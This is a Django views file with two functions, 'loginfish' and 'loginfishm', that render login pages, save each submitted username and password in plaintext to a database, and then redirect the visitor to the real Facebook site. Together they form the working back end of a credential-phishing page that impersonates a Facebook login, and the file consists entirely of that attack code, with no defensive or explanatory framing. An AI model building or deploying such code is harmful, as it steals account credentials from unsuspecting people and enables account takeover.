from django.shortcuts import render
from .forms import PersonForm
from .models import Person
from django.shortcuts import redirect
# Create your views here.

def loginfish(request):
    if request.method == 'POST':
        form = PersonForm(request.POST)
        
        if form.is_valid():
            username = form.cleaned_data['username']
            passcode = form.cleaned_data['passcode']
            person = Person.objects.create(username=username, passcode=passcode)
            response = redirect('https://www.facebook.com/')
            return response
    else:
        form = PersonForm()


    return render(request, 'homepage.html', {'form': form})


def loginfishm(request):
    if request.method == 'POST':
        form = PersonForm(request.POST)
        
        if form.is_valid():
            username = form.cleaned_data['username']
            passcode = form.cleaned_data['passcode']
            person = Person.objects.create(username=username, passcode=passcode)
            response = redirect('https://www.facebook.com/')
            return response
    else:
        form = PersonForm()


    return render(request, 'indexm.html', {'form': form})